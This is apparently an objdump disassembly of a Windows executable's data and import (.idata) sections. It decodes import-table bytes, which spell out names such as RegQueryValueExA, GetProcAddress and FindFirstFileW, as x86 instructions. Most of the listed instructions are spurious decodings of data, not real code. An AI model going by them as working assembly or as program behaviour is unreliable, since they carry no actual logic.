  4110e3:	add    BYTE PTR [esi],al
  4110e5:	add    BYTE PTR [eax],al
  4110e7:	add    BYTE PTR [esi+eiz*1],dh
  4110ea:	inc    eax
  4110eb:	add    BYTE PTR [edx],al
  4110ed:	add    BYTE PTR [eax],al
  4110ef:	add    BYTE PTR [esi+eiz*1],bh
  4110f2:	inc    eax
  4110f3:	add    BYTE PTR [ecx],al
  4110f5:	add    BYTE PTR [eax],al
  4110f7:	add    BYTE PTR [esi+eiz*1+0x40],al
  4110fb:	add    BYTE PTR ds:0x48000000,al
  411101:	es inc eax
  411103:	add    BYTE PTR [ebx],al
  411105:	add    BYTE PTR [eax],al
  411107:	add    BYTE PTR [esi+eiz*1+0x40],cl
  41110b:	add    BYTE PTR [eax+eax*1],al
  41110e:	add    BYTE PTR [eax],al
  411110:	push   esp
  411111:	es inc eax
  411113:	add    BYTE PTR [eax+eax*1],dl
  411116:	add    BYTE PTR [eax],al
  411118:	pop    eax
  411119:	es inc eax
  41111b:	add    BYTE PTR ds:0x0,dl
	...
  411129:	add    DWORD PTR [eax],eax
  41112b:	add    BYTE PTR [ecx],al
  41112d:	add    DWORD PTR [eax],eax
  41112f:	add    DWORD PTR [ecx],eax
  411131:	add    BYTE PTR [ecx],al
  411133:	add    BYTE PTR [eax],al
  411135:	add    DWORD PTR [eax],eax
  411137:	add    DWORD PTR [eax],eax
  411139:	add    DWORD PTR [ecx],eax
  41113b:	add    BYTE PTR [eax],al
  41113d:	add    DWORD PTR [eax],eax
  41113f:	add    BYTE PTR [ecx],al
  411141:	add    BYTE PTR [eax],al
  411143:	add    BYTE PTR [eax],al
  411145:	add    DWORD PTR [edx],eax
  411147:	add    eax,DWORD PTR [eax*1+0x7070606]
  41114e:	pop    es
  41114f:	pop    es
  411150:	or     BYTE PTR [eax],cl
  411152:	or     DWORD PTR [ecx],ecx
  411154:	or     cl,BYTE PTR [edx]
  411156:	or     cl,BYTE PTR [ebx]
  411158:	or     ecx,DWORD PTR [ebx]
  41115a:	or     al,0xc
  41115c:	or     al,0x0
	...

Disassembly of section .idata:

00437000 <.idata>:
  437000:	push   eax
  437001:	jo     0x437006
	...
  43700b:	add    BYTE PTR [edx-0x27fffc8b],dl
  437011:	jb     0x437016
  437013:	add    BYTE PTR [eax+0x70],ah
  437016:	add    eax,DWORD PTR [eax]
	...
  437020:	cmp    BYTE PTR [ecx+0x3],bh
  437023:	add    al,ch
  437025:	jb     0x43702a
  437027:	add    BYTE PTR [eax+0x71],al
  43702a:	add    eax,DWORD PTR [eax]
	...
  437034:	pop    esi
  437035:	jge    0x43703a
  437037:	add    al,cl
  437039:	jae    0x43703e
	...
  43704f:	add    BYTE PTR [eax+0x75],dh
  437052:	add    eax,DWORD PTR [eax]
  437054:	test   BYTE PTR [ebp+0x3],dh
  437057:	add    BYTE PTR [eax+0x75],ah
  43705a:	add    eax,DWORD PTR [eax]
  43705c:	add    BYTE PTR [eax],al
  43705e:	add    BYTE PTR [eax],al
  437060:	mov    al,ds:0xb2000375
  437065:	jne    0x43706a
  437067:	add    dl,al
  437069:	jne    0x43706e
  43706b:	add    dh,dl
  43706d:	jne    0x437072
  43706f:	add    al,ch
  437071:	jne    0x437076
  437073:	add    dh,bh
  437075:	jne    0x43707a
  437077:	add    BYTE PTR [esi+esi*2],dl
  43707a:	add    eax,DWORD PTR [eax]
  43707c:	sbb    al,0x76
  43707e:	add    eax,DWORD PTR [eax]
  437080:	sub    dh,BYTE PTR [esi+0x3]
  437083:	add    BYTE PTR [esi+esi*2+0x3],al
  437087:	add    BYTE PTR [edx+0x76],dl
  43708a:	add    eax,DWORD PTR [eax]
  43708c:	pusha  
  43708d:	jbe    0x437092
  43708f:	add    BYTE PTR [edx+0x76],dh
  437092:	add    eax,DWORD PTR [eax]
  437094:	jle    0x43710c
  437096:	add    eax,DWORD PTR [eax]
  437098:	mov    ?,WORD PTR [esi+0x3]
  43709b:	add    BYTE PTR [esi+esi*2+0x76b00003],bl
  4370a2:	add    eax,DWORD PTR [eax]
  4370a4:	(bad)  
  4370a5:	jbe    0x4370aa
  4370a7:	add    al,ah
  4370a9:	jbe    0x4370ae
  4370ab:	add    BYTE PTR [eax],al
  4370ad:	ja     0x4370b2
  4370af:	add    BYTE PTR [eax],ah
  4370b1:	ja     0x4370b6
  4370b3:	add    BYTE PTR [edi+esi*2],ch
  4370b6:	add    eax,DWORD PTR [eax]
  4370b8:	ds ja  0x4370be
  4370bb:	add    BYTE PTR [edx+0x77],cl
  4370be:	add    eax,DWORD PTR [eax]
  4370c0:	pop    edx
  4370c1:	ja     0x4370c6
  4370c3:	add    BYTE PTR [edi+esi*2+0x3],ch
  4370c7:	add    BYTE PTR [edx+0x77],bh
  4370ca:	add    eax,DWORD PTR [eax]
  4370cc:	xchg   esi,eax
  4370cd:	ja     0x4370d2
  4370cf:	add    BYTE PTR [edi+esi*2+0x77bc0003],ch
  4370d6:	add    eax,DWORD PTR [eax]
  4370d8:	int3   
  4370d9:	ja     0x4370de
  4370db:	add    ah,bl
  4370dd:	ja     0x4370e2
  4370df:	add    al,dh
  4370e1:	ja     0x4370e6
  4370e3:	add    BYTE PTR [edx],al
  4370e5:	js     0x4370ea
  4370e7:	add    BYTE PTR [eax],bl
  4370e9:	js     0x4370ee
  4370eb:	add    BYTE PTR [esi],ch
  4370ed:	js     0x4370f2
  4370ef:	add    BYTE PTR [eax+0x78],al
  4370f2:	add    eax,DWORD PTR [eax]
  4370f4:	push   eax
  4370f5:	js     0x4370fa
  4370f7:	add    BYTE PTR [eax+edi*2+0x3],bl
  4370fb:	add    BYTE PTR [esi+0x78],ch
  4370fe:	add    eax,DWORD PTR [eax]
  437100:	jle    0x43717a
  437102:	add    eax,DWORD PTR [eax]
  437104:	pushf  
  437105:	js     0x43710a
  437107:	add    BYTE PTR [eax+edi*2+0x78c20003],ch
  43710e:	add    eax,DWORD PTR [eax]
  437110:	sar    BYTE PTR [eax+0x3],1
  437113:	add    dl,ah
  437115:	js     0x43711a
  437117:	add    ah,bh
  437119:	js     0x43711e
  43711b:	add    BYTE PTR [ecx+edi*2],dl
  43711e:	add    eax,DWORD PTR [eax]
  437120:	es jns 0x437126
  437123:	add    BYTE PTR [edx-0x5ffffc82],bh
  437129:	jle    0x43712e
  43712b:	add    BYTE PTR [esi+edi*2+0x7e700003],al
  437132:	add    eax,DWORD PTR [eax]
  437134:	pusha  
  437135:	jle    0x43713a
  437137:	add    ah,cl
  437139:	jle    0x43713e
  43713b:	add    BYTE PTR [eax],al
  43713d:	add    BYTE PTR [eax],al
  43713f:	add    BYTE PTR [eax-0x6bfffc87],cl
  437145:	jns    0x43714a
  437147:	add    BYTE PTR [edx-0x51fffc87],ah
  43714d:	jns    0x437152
  43714f:	add    BYTE PTR [edx-0x3bfffc87],bh
  437155:	jns    0x43715a
  437157:	add    al,dl
  437159:	jns    0x43715e
  43715b:	add    dl,bl
  43715d:	jns    0x437162
  43715f:	add    ah,ah
  437161:	jns    0x437166
  437163:	add    dh,ch
  437165:	jns    0x43716a
  437167:	add    dh,dh
  437169:	jns    0x43716e
  43716b:	add    BYTE PTR [eax],al
  43716d:	jp     0x437172
  43716f:	add    BYTE PTR [edx+edi*2],cl
  437172:	add    eax,DWORD PTR [eax]
  437174:	push   ss
  437175:	jp     0x43717a
  437177:	add    BYTE PTR [eax],ah
  437179:	jp     0x43717e
  43717b:	add    BYTE PTR [esi],ch
  43717d:	jp     0x437182
  43717f:	add    BYTE PTR [edx],bh
  437181:	jp     0x437186
  437183:	add    BYTE PTR [esi+0x7a],al
  437186:	add    eax,DWORD PTR [eax]
  437188:	push   edx
  437189:	jp     0x43718e
  43718b:	add    BYTE PTR [esi+0x7a],bl
  43718e:	add    eax,DWORD PTR [eax]
  437190:	jp     0x43720b
  437192:	add    eax,DWORD PTR [eax]
  437194:	je     0x437210
  437196:	add    eax,DWORD PTR [eax]
  437198:	cmp    BYTE PTR [edx+0x3],0x0
  43719c:	mov    ?,WORD PTR [edx+0x3]
  43719f:	add    BYTE PTR [esi-0x5ffffc86],dl
  4371a5:	jp     0x4371aa
  4371a7:	add    BYTE PTR [edx-0x4dfffc86],ch
  4371ad:	jp     0x4371b2
  4371af:	add    BYTE PTR [edx+edi*2+0x7acc0003],bh
  4371b6:	add    eax,DWORD PTR [eax]
  4371b8:	fdivr  QWORD PTR [edx+0x3]
  4371bb:	add    dl,ch
  4371bd:	jp     0x4371c2
  4371bf:	add    ah,dh
  4371c1:	jp     0x4371c6
  4371c3:	add    BYTE PTR [eax],al
  4371c5:	jnp    0x4371ca
  4371c7:	add    BYTE PTR [ebx+edi*2],cl
  4371ca:	add    eax,DWORD PTR [eax]
  4371cc:	sbb    bh,BYTE PTR [ebx+0x3]
  4371cf:	add    BYTE PTR [eax],ch
  4371d1:	jnp    0x4371d6
  4371d3:	add    BYTE PTR [esi],dh
  4371d5:	jnp    0x4371da
  4371d7:	add    BYTE PTR [eax+0x7b],al
  4371da:	add    eax,DWORD PTR [eax]
  4371dc:	dec    edx
  4371dd:	jnp    0x4371e2
  4371df:	add    BYTE PTR [ebx+edi*2+0x3],dl
  4371e3:	add    BYTE PTR [ebx+edi*2+0x3],bl
  4371e7:	add    BYTE PTR [eax+0x7b],ch
  4371ea:	add    eax,DWORD PTR [eax]
  4371ec:	jb     0x437269
  4371ee:	add    eax,DWORD PTR [eax]
  4371f0:	jl     0x43726d
  4371f2:	add    eax,DWORD PTR [eax]
  4371f4:	xchg   BYTE PTR [ebx+0x3],bh
  4371f7:	add    BYTE PTR [edx-0x61fffc85],dl
  4371fd:	jnp    0x437202
  4371ff:	add    BYTE PTR [eax-0x4bfffc85],ch
  437205:	jnp    0x43720a
  437207:	add    dl,al
  437209:	jnp    0x43720e
  43720b:	add    dh,cl
  43720d:	jnp    0x437212
  43720f:	add    al,dh
  437211:	jnp    0x437216
  437213:	add    dl,bh
  437215:	jnp    0x43721a
  437217:	add    BYTE PTR [esi],al
  437219:	jl     0x43721e
  43721b:	add    BYTE PTR [edx],dl
  43721d:	jl     0x437222
  43721f:	add    BYTE PTR [esi],bl
  437221:	jl     0x437226
  437223:	add    BYTE PTR [edx],ch
  437225:	jl     0x43722a
  437227:	add    BYTE PTR [esi],dh
  437229:	jl     0x43722e
  43722b:	add    BYTE PTR [edx+0x7c],al
  43722e:	add    eax,DWORD PTR [eax]
  437230:	push   eax
  437231:	jl     0x437236
  437233:	add    BYTE PTR [edx+0x7c],ah
  437236:	add    eax,DWORD PTR [eax]
  437238:	ins    BYTE PTR es:[edi],dx
  437239:	jl     0x43723e
  43723b:	add    BYTE PTR [esi+0x7c],dh
  43723e:	add    eax,DWORD PTR [eax]
  437240:	cmp    BYTE PTR [ebx+eax*1+0x0],0x8e
  437245:	jl     0x43724a
  437247:	add    BYTE PTR [edx-0x5bfffc84],bl
  43724d:	jl     0x437252
  43724f:	add    BYTE PTR [edx-0x3ffffc84],dh
  437255:	jl     0x43725a
  437257:	add    dl,dl
  437259:	jl     0x43725e
  43725b:	add    ah,ah
  43725d:	jl     0x437262
  43725f:	add    ah,ch
  437261:	jl     0x437266
  437263:	add    dh,dh
  437265:	jl     0x43726a
  437267:	add    BYTE PTR [edi*2+0x7d200003],cl
  43726e:	add    eax,DWORD PTR [eax]
  437270:	cs jge 0x437276
  437273:	add    BYTE PTR [edx],bh
  437275:	jge    0x43727a
  437277:	add    BYTE PTR [eax+0x7d],cl
  43727a:	add    eax,DWORD PTR [eax]
  43727c:	push   edx
  43727d:	jge    0x437282
  43727f:	add    BYTE PTR [ebp+edi*2+0x3],ch
  437283:	add    BYTE PTR [edx-0x63fffc83],al
  437289:	jge    0x43728e
  43728b:	add    BYTE PTR [ebp+edi*2+0x7dc80003],dh
  437292:	add    eax,DWORD PTR [eax]
  437294:	in     al,dx
  437295:	jge    0x43729a
  437297:	add    ah,dh
  437299:	jge    0x43729e
  43729b:	add    dh,bh
  43729d:	jge    0x4372a2
  43729f:	add    BYTE PTR [esi+edi*2],cl
  4372a2:	add    eax,DWORD PTR [eax]
  4372a4:	sbb    bh,BYTE PTR [esi+0x3]
  4372a7:	add    BYTE PTR [esi+edi*2],ah
  4372aa:	add    eax,DWORD PTR [eax]
  4372ac:	ss jle 0x4372b2
  4372af:	add    BYTE PTR [esi+0x7e],al
  4372b2:	add    eax,DWORD PTR [eax]
  4372b4:	outs   dx,BYTE PTR ds:[esi]
  4372b5:	jns    0x4372ba
  4372b7:	add    BYTE PTR [ecx+edi*2+0x3],ah
  4372bb:	add    BYTE PTR [edx+0x79],bl
  4372be:	add    eax,DWORD PTR [eax]
  4372c0:	dec    esi
  4372c1:	jns    0x4372c6
  4372c3:	add    BYTE PTR [esi+0x79],al
  4372c6:	add    eax,DWORD PTR [eax]
  4372c8:	push   0x7a
  4372ca:	add    eax,DWORD PTR [eax]
  4372cc:	fdivr  QWORD PTR [esi+0x3]
  4372cf:	add    dh,ah
  4372d1:	jle    0x4372d6
  4372d3:	add    BYTE PTR [eax],al
  4372d5:	add    BYTE PTR [eax],al
  4372d7:	add    BYTE PTR [eax+0x75],dh
  4372da:	add    eax,DWORD PTR [eax]
  4372dc:	test   BYTE PTR [ebp+0x3],dh
  4372df:	add    BYTE PTR [eax+0x75],ah
  4372e2:	add    eax,DWORD PTR [eax]
  4372e4:	add    BYTE PTR [eax],al
  4372e6:	add    BYTE PTR [eax],al
  4372e8:	mov    al,ds:0xb2000375
  4372ed:	jne    0x4372f2
  4372ef:	add    dl,al
  4372f1:	jne    0x4372f6
  4372f3:	add    dh,dl
  4372f5:	jne    0x4372fa
  4372f7:	add    al,ch
  4372f9:	jne    0x4372fe
  4372fb:	add    dh,bh
  4372fd:	jne    0x437302
  4372ff:	add    BYTE PTR [esi+esi*2],dl
  437302:	add    eax,DWORD PTR [eax]
  437304:	sbb    al,0x76
  437306:	add    eax,DWORD PTR [eax]
  437308:	sub    dh,BYTE PTR [esi+0x3]
  43730b:	add    BYTE PTR [esi+esi*2+0x3],al
  43730f:	add    BYTE PTR [edx+0x76],dl
  437312:	add    eax,DWORD PTR [eax]
  437314:	pusha  
  437315:	jbe    0x43731a
  437317:	add    BYTE PTR [edx+0x76],dh
  43731a:	add    eax,DWORD PTR [eax]
  43731c:	jle    0x437394
  43731e:	add    eax,DWORD PTR [eax]
  437320:	mov    ?,WORD PTR [esi+0x3]
  437323:	add    BYTE PTR [esi+esi*2+0x76b00003],bl
  43732a:	add    eax,DWORD PTR [eax]
  43732c:	(bad)  
  43732d:	jbe    0x437332
  43732f:	add    al,ah
  437331:	jbe    0x437336
  437333:	add    BYTE PTR [eax],al
  437335:	ja     0x43733a
  437337:	add    BYTE PTR [eax],ah
  437339:	ja     0x43733e
  43733b:	add    BYTE PTR [edi+esi*2],ch
  43733e:	add    eax,DWORD PTR [eax]
  437340:	ds ja  0x437346
  437343:	add    BYTE PTR [edx+0x77],cl
  437346:	add    eax,DWORD PTR [eax]
  437348:	pop    edx
  437349:	ja     0x43734e
  43734b:	add    BYTE PTR [edi+esi*2+0x3],ch
  43734f:	add    BYTE PTR [edx+0x77],bh
  437352:	add    eax,DWORD PTR [eax]
  437354:	xchg   esi,eax
  437355:	ja     0x43735a
  437357:	add    BYTE PTR [edi+esi*2+0x77bc0003],ch
  43735e:	add    eax,DWORD PTR [eax]
  437360:	int3   
  437361:	ja     0x437366
  437363:	add    ah,bl
  437365:	ja     0x43736a
  437367:	add    al,dh
  437369:	ja     0x43736e
  43736b:	add    BYTE PTR [edx],al
  43736d:	js     0x437372
  43736f:	add    BYTE PTR [eax],bl
  437371:	js     0x437376
  437373:	add    BYTE PTR [esi],ch
  437375:	js     0x43737a
  437377:	add    BYTE PTR [eax+0x78],al
  43737a:	add    eax,DWORD PTR [eax]
  43737c:	push   eax
  43737d:	js     0x437382
  43737f:	add    BYTE PTR [eax+edi*2+0x3],bl
  437383:	add    BYTE PTR [esi+0x78],ch
  437386:	add    eax,DWORD PTR [eax]
  437388:	jle    0x437402
  43738a:	add    eax,DWORD PTR [eax]
  43738c:	pushf  
  43738d:	js     0x437392
  43738f:	add    BYTE PTR [eax+edi*2+0x78c20003],ch
  437396:	add    eax,DWORD PTR [eax]
  437398:	sar    BYTE PTR [eax+0x3],1
  43739b:	add    dl,ah
  43739d:	js     0x4373a2
  43739f:	add    ah,bh
  4373a1:	js     0x4373a6
  4373a3:	add    BYTE PTR [ecx+edi*2],dl
  4373a6:	add    eax,DWORD PTR [eax]
  4373a8:	es jns 0x4373ae
  4373ab:	add    BYTE PTR [edx-0x5ffffc82],bh
  4373b1:	jle    0x4373b6
  4373b3:	add    BYTE PTR [esi+edi*2+0x7e700003],al
  4373ba:	add    eax,DWORD PTR [eax]
  4373bc:	pusha  
  4373bd:	jle    0x4373c2
  4373bf:	add    ah,cl
  4373c1:	jle    0x4373c6
  4373c3:	add    BYTE PTR [eax],al
  4373c5:	add    BYTE PTR [eax],al
  4373c7:	add    BYTE PTR [eax-0x6bfffc87],cl
  4373cd:	jns    0x4373d2
  4373cf:	add    BYTE PTR [edx-0x51fffc87],ah
  4373d5:	jns    0x4373da
  4373d7:	add    BYTE PTR [edx-0x3bfffc87],bh
  4373dd:	jns    0x4373e2
  4373df:	add    al,dl
  4373e1:	jns    0x4373e6
  4373e3:	add    dl,bl
  4373e5:	jns    0x4373ea
  4373e7:	add    ah,ah
  4373e9:	jns    0x4373ee
  4373eb:	add    dh,ch
  4373ed:	jns    0x4373f2
  4373ef:	add    dh,dh
  4373f1:	jns    0x4373f6
  4373f3:	add    BYTE PTR [eax],al
  4373f5:	jp     0x4373fa
  4373f7:	add    BYTE PTR [edx+edi*2],cl
  4373fa:	add    eax,DWORD PTR [eax]
  4373fc:	push   ss
  4373fd:	jp     0x437402
  4373ff:	add    BYTE PTR [eax],ah
  437401:	jp     0x437406
  437403:	add    BYTE PTR [esi],ch
  437405:	jp     0x43740a
  437407:	add    BYTE PTR [edx],bh
  437409:	jp     0x43740e
  43740b:	add    BYTE PTR [esi+0x7a],al
  43740e:	add    eax,DWORD PTR [eax]
  437410:	push   edx
  437411:	jp     0x437416
  437413:	add    BYTE PTR [esi+0x7a],bl
  437416:	add    eax,DWORD PTR [eax]
  437418:	jp     0x437493
  43741a:	add    eax,DWORD PTR [eax]
  43741c:	je     0x437498
  43741e:	add    eax,DWORD PTR [eax]
  437420:	cmp    BYTE PTR [edx+0x3],0x0
  437424:	mov    ?,WORD PTR [edx+0x3]
  437427:	add    BYTE PTR [esi-0x5ffffc86],dl
  43742d:	jp     0x437432
  43742f:	add    BYTE PTR [edx-0x4dfffc86],ch
  437435:	jp     0x43743a
  437437:	add    BYTE PTR [edx+edi*2+0x7acc0003],bh
  43743e:	add    eax,DWORD PTR [eax]
  437440:	fdivr  QWORD PTR [edx+0x3]
  437443:	add    dl,ch
  437445:	jp     0x43744a
  437447:	add    ah,dh
  437449:	jp     0x43744e
  43744b:	add    BYTE PTR [eax],al
  43744d:	jnp    0x437452
  43744f:	add    BYTE PTR [ebx+edi*2],cl
  437452:	add    eax,DWORD PTR [eax]
  437454:	sbb    bh,BYTE PTR [ebx+0x3]
  437457:	add    BYTE PTR [eax],ch
  437459:	jnp    0x43745e
  43745b:	add    BYTE PTR [esi],dh
  43745d:	jnp    0x437462
  43745f:	add    BYTE PTR [eax+0x7b],al
  437462:	add    eax,DWORD PTR [eax]
  437464:	dec    edx
  437465:	jnp    0x43746a
  437467:	add    BYTE PTR [ebx+edi*2+0x3],dl
  43746b:	add    BYTE PTR [ebx+edi*2+0x3],bl
  43746f:	add    BYTE PTR [eax+0x7b],ch
  437472:	add    eax,DWORD PTR [eax]
  437474:	jb     0x4374f1
  437476:	add    eax,DWORD PTR [eax]
  437478:	jl     0x4374f5
  43747a:	add    eax,DWORD PTR [eax]
  43747c:	xchg   BYTE PTR [ebx+0x3],bh
  43747f:	add    BYTE PTR [edx-0x61fffc85],dl
  437485:	jnp    0x43748a
  437487:	add    BYTE PTR [eax-0x4bfffc85],ch
  43748d:	jnp    0x437492
  43748f:	add    dl,al
  437491:	jnp    0x437496
  437493:	add    dh,cl
  437495:	jnp    0x43749a
  437497:	add    al,dh
  437499:	jnp    0x43749e
  43749b:	add    dl,bh
  43749d:	jnp    0x4374a2
  43749f:	add    BYTE PTR [esi],al
  4374a1:	jl     0x4374a6
  4374a3:	add    BYTE PTR [edx],dl
  4374a5:	jl     0x4374aa
  4374a7:	add    BYTE PTR [esi],bl
  4374a9:	jl     0x4374ae
  4374ab:	add    BYTE PTR [edx],ch
  4374ad:	jl     0x4374b2
  4374af:	add    BYTE PTR [esi],dh
  4374b1:	jl     0x4374b6
  4374b3:	add    BYTE PTR [edx+0x7c],al
  4374b6:	add    eax,DWORD PTR [eax]
  4374b8:	push   eax
  4374b9:	jl     0x4374be
  4374bb:	add    BYTE PTR [edx+0x7c],ah
  4374be:	add    eax,DWORD PTR [eax]
  4374c0:	ins    BYTE PTR es:[edi],dx
  4374c1:	jl     0x4374c6
  4374c3:	add    BYTE PTR [esi+0x7c],dh
  4374c6:	add    eax,DWORD PTR [eax]
  4374c8:	cmp    BYTE PTR [ebx+eax*1+0x0],0x8e
  4374cd:	jl     0x4374d2
  4374cf:	add    BYTE PTR [edx-0x5bfffc84],bl
  4374d5:	jl     0x4374da
  4374d7:	add    BYTE PTR [edx-0x3ffffc84],dh
  4374dd:	jl     0x4374e2
  4374df:	add    dl,dl
  4374e1:	jl     0x4374e6
  4374e3:	add    ah,ah
  4374e5:	jl     0x4374ea
  4374e7:	add    ah,ch
  4374e9:	jl     0x4374ee
  4374eb:	add    dh,dh
  4374ed:	jl     0x4374f2
  4374ef:	add    BYTE PTR [edi*2+0x7d200003],cl
  4374f6:	add    eax,DWORD PTR [eax]
  4374f8:	cs jge 0x4374fe
  4374fb:	add    BYTE PTR [edx],bh
  4374fd:	jge    0x437502
  4374ff:	add    BYTE PTR [eax+0x7d],cl
  437502:	add    eax,DWORD PTR [eax]
  437504:	push   edx
  437505:	jge    0x43750a
  437507:	add    BYTE PTR [ebp+edi*2+0x3],ch
  43750b:	add    BYTE PTR [edx-0x63fffc83],al
  437511:	jge    0x437516
  437513:	add    BYTE PTR [ebp+edi*2+0x7dc80003],dh
  43751a:	add    eax,DWORD PTR [eax]
  43751c:	in     al,dx
  43751d:	jge    0x437522
  43751f:	add    ah,dh
  437521:	jge    0x437526
  437523:	add    dh,bh
  437525:	jge    0x43752a
  437527:	add    BYTE PTR [esi+edi*2],cl
  43752a:	add    eax,DWORD PTR [eax]
  43752c:	sbb    bh,BYTE PTR [esi+0x3]
  43752f:	add    BYTE PTR [esi+edi*2],ah
  437532:	add    eax,DWORD PTR [eax]
  437534:	ss jle 0x43753a
  437537:	add    BYTE PTR [esi+0x7e],al
  43753a:	add    eax,DWORD PTR [eax]
  43753c:	outs   dx,BYTE PTR ds:[esi]
  43753d:	jns    0x437542
  43753f:	add    BYTE PTR [ecx+edi*2+0x3],ah
  437543:	add    BYTE PTR [edx+0x79],bl
  437546:	add    eax,DWORD PTR [eax]
  437548:	dec    esi
  437549:	jns    0x43754e
  43754b:	add    BYTE PTR [esi+0x79],al
  43754e:	add    eax,DWORD PTR [eax]
  437550:	push   0x7a
  437552:	add    eax,DWORD PTR [eax]
  437554:	fdivr  QWORD PTR [esi+0x3]
  437557:	add    dh,ah
  437559:	jle    0x43755e
  43755b:	add    BYTE PTR [eax],al
  43755d:	add    BYTE PTR [eax],al
  43755f:	add    BYTE PTR [ecx+0x67655202],cl
  437565:	dec    edi
  437566:	jo     0x4375cd
  437568:	outs   dx,BYTE PTR ds:[esi]
  437569:	dec    ebx
  43756a:	gs jns 0x4375b2
  43756d:	js     0x4375c6
  43756f:	add    BYTE PTR [esi+0x67655202],dl
  437575:	push   ecx
  437576:	jne    0x4375dd
  437578:	jb     0x4375f3
  43757a:	push   esi
  43757b:	popa   
  43757c:	ins    BYTE PTR es:[edi],dx
  43757d:	jne    0x4375e4
  43757f:	inc    ebp
  437580:	js     0x4375d9
  437582:	add    BYTE PTR [eax],al
  437584:	pop    eax
  437585:	add    dl,BYTE PTR [edx+0x65]
  437588:	addr16 inc ebx
  43758a:	ins    BYTE PTR es:[edi],dx
  43758b:	outs   dx,DWORD PTR ds:[esi]
  43758c:	jae    0x4375f3
  43758e:	dec    ebx
  43758f:	gs jns 0x437592
  437592:	inc    ecx
  437593:	inc    esp
  437594:	push   esi
  437595:	inc    ecx
  437596:	push   eax
  437597:	dec    ecx
  437598:	xor    esi,DWORD PTR [edx]
  43759a:	cs fs ins BYTE PTR es:[edi],dx
  43759d:	ins    BYTE PTR es:[edi],dx
  43759e:	add    BYTE PTR [eax],al
  4375a0:	mov    ds:0x6e694601,eax
  4375a5:	fs push edx
  4375a7:	gs jae 0x437619
  4375aa:	jne    0x43761e
  4375ac:	arpl   WORD PTR [ebp+0x45],sp
  4375af:	js     0x437608
  4375b1:	add    dh,al
  4375b3:	add    ecx,DWORD PTR [edi+ebp*2+0x61]
  4375b7:	fs push edx
  4375b9:	gs jae 0x43762b
  4375bc:	jne    0x437630
  4375be:	arpl   WORD PTR [ebp+0x0],sp
  4375c1:	add    BYTE PTR [ecx+0x74654702],al
  4375c7:	dec    ebp
  4375c8:	outs   dx,DWORD PTR ds:[esi]
  4375c9:	fs jne 0x437638
  4375cc:	gs dec eax
  4375ce:	popa   
  4375cf:	outs   dx,BYTE PTR ds:[esi]
  4375d0:	fs ins BYTE PTR es:[edi],dx
  4375d2:	gs push edi
  4375d4:	add    BYTE PTR [eax],al
  4375d6:	mov    ch,0x2
  4375d8:	inc    edi
  4375d9:	gs je  0x43762c
  4375dc:	jb     0x43764d
  4375de:	arpl   WORD PTR [ecx+0x64],ax
  4375e1:	fs jb  0x437649
  4375e4:	jae    0x437659
  4375e6:	add    BYTE PTR [eax],al
  4375e8:	mov    ebx,0x69615705
  4375ed:	je     0x437635
  4375ef:	outs   dx,DWORD PTR ds:[esi]
  4375f0:	jb     0x437645
  4375f2:	imul   ebp,DWORD PTR [esi+0x67],0x624f656c
  4375f9:	push   0x65
  4375fb:	arpl   WORD PTR [eax+eax*1+0x45],si
  4375ff:	add    al,BYTE PTR [edi+0x65]
  437602:	je     0x437649
  437604:	js     0x43766f
  437606:	je     0x43764b
  437608:	outs   dx,DWORD PTR ds:[esi]
  437609:	fs gs push eax
  43760c:	jb     0x43767d
  43760e:	arpl   WORD PTR [ebp+0x73],sp
  437611:	jae    0x437613
  437613:	add    BYTE PTR [edi+0x5],bl
  437616:	push   ebx
  437617:	ins    BYTE PTR es:[edi],dx
  437618:	gs gs jo 0x43761c
  43761c:	mov    es,WORD PTR [eax]
  43761e:	inc    ebx
  43761f:	ins    BYTE PTR es:[edi],dx
  437620:	outs   dx,DWORD PTR ds:[esi]
  437621:	jae    0x437688
  437623:	dec    eax
  437624:	popa   
  437625:	outs   dx,BYTE PTR ds:[esi]
  437626:	fs ins BYTE PTR es:[edi],dx
  437628:	gs add ah,dh
  43762b:	add    al,BYTE PTR [edi+0x65]
  43762e:	je     0x437683
  437630:	jns    0x4376a5
  437632:	je     0x437699
  437634:	ins    DWORD PTR es:[edi],dx
  437635:	push   esp
  437636:	imul   ebp,DWORD PTR [ebp+0x65],0x69467341
  43763d:	ins    BYTE PTR es:[edi],dx
  43763e:	gs push esp
  437640:	imul   ebp,DWORD PTR [ebp+0x65],0x4300d600
  437647:	jb     0x4376ae
  437649:	popa   
  43764a:	je     0x4376b1
  43764c:	inc    esi
  43764d:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x53050c00
  437655:	gs je  0x43769e
  437658:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x656d69
  437660:	pop    DWORD PTR [ecx]
  437662:	inc    esi
  437663:	imul   ebp,DWORD PTR [esi+0x64],0x73726946
  43766a:	je     0x4376b2
  43766c:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x1840000
  437674:	inc    esi
  437675:	imul   ebp,DWORD PTR [esi+0x64],0x736f6c43
  43767c:	add    BYTE PTR gs:[ebx+0x6e694601],bl
  437683:	fs dec esi
  437685:	gs js  0x4376fc
  437688:	inc    esi
  437689:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x47025600
  437691:	gs je  0x4376da
  437694:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x656d69
  43769c:	inc    DWORD PTR [edx]
  43769e:	inc    edi
  43769f:	gs je  0x4376f6
  4376a2:	gs ins DWORD PTR es:[edi],dx
  4376a4:	jo     0x4376ec
  4376a6:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x57656d61
  4376ae:	add    BYTE PTR [eax],al
  4376b0:	fld    QWORD PTR ds:0x65646957
  4376b6:	inc    ebx
  4376b7:	push   0x6f547261
  4376bc:	dec    ebp
  4376bd:	jne    0x43772b
  4376bf:	je     0x43772a
  4376c1:	inc    edx
  4376c2:	jns    0x437738
  4376c4:	add    BYTE PTR gs:[edx+0x2],al
  4376c8:	inc    edi
  4376c9:	gs je  0x437711
  4376cc:	outs   dx,BYTE PTR ds:[esi]
  4376cd:	jbe    0x437738
  4376cf:	jb     0x437740
  4376d1:	outs   dx,BYTE PTR ds:[esi]
  4376d2:	ins    DWORD PTR es:[edi],dx
  4376d3:	outs   dx,BYTE PTR gs:[esi]
  4376d5:	je     0x43772d
  4376d7:	popa   
  4376d8:	jb     0x437743
  4376da:	popa   
  4376db:	bound  ebp,QWORD PTR [ebp+eiz*2+0x57]
  4376df:	add    BYTE PTR [ecx+0x5],al
  4376e2:	push   ebx
  4376e3:	gs je  0x43773a
  4376e6:	push   0x64616572
  4376eb:	push   eax
  4376ec:	jb     0x437753
  4376ee:	data16 gs jb 0x437764
  4376f2:	gs fs push ebp
